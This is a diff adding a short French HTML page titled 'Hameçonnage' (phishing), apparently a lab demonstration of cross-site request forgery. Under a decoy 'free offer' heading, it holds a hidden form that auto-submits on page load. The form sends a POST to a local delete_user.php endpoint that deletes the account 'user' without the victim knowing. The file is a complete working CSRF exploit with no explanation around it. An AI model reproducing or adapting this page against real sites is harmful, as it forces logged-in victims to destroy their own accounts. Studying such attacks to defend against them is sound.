@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Hameçonnage</title>
+</head>
+
+<body>
+    <h1>Chargement d'une offre gratuite...</h1>
+
+    <form id="csrfForm" action="http://localhost:8080/delete_user.php" method="POST">
+        <input type="hidden" name="username" value="user">
+    </form>
+
+    <script>
+        // Envoi automatique du formulaire à l'insu de la victime
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+
+</html>
